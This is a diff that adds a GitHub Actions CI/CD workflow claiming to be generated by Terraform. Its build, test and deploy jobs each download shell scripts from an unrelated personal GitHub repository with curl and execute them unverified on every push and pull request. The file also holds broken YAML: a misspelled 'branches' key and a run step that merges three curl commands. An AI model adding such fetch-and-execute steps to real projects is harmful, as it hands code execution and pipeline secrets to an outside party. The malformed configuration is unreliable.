@@ -1,0 +1,62 @@
+# This workflow is automatically created by Terraform.
+name: CI/CD workflow
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branhces: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      - name: Download build script
+        run: curl -o $PWD/cicd/build.sh https://raw.githubusercontent.com/matiiponchon/53490083/main/build.sh --create-dirs
+          curl -o $PWD/cicd/test.sh https://raw.githubusercontent.com/matiiponchon/53490083/main/test.sh
+          curl -o $PWD/cicd/deploy.sh https://raw.githubusercontent.com/matiiponchon/53490083/main/deploy.sh
+      
+      - name: Give script execution permissions
+        run: chmod u+x $PWD/cicd/build.sh
+      
+      - name: Execute script
+        run: $PWD/cicd/build.sh
+  
+  test:
+    needs: build
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      - name: Download test script
+        run: curl -o $PWD/cicd/test.sh https://raw.githubusercontent.com/matiiponchon/53490083/main/test.sh --create-dirs
+
+      - name: Give script execution permissions
+        run: chmod u+x $PWD/cicd/test.sh
+      
+      - name: Execute script
+        run: $PWD/cicd/test.sh
+  
+  deploy:
+    needs: test
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      - name: Download deploy script
+        run: curl -o $PWD/cicd/deploy.sh https://raw.githubusercontent.com/matiiponchon/53490083/main/deploy.sh --create-dirs
+
+      - name: Give script execution permissions
+        run: chmod u+x $PWD/cicd/deploy.sh
+      
+      - name: Execute script
+        run: $PWD/cicd/deploy.sh
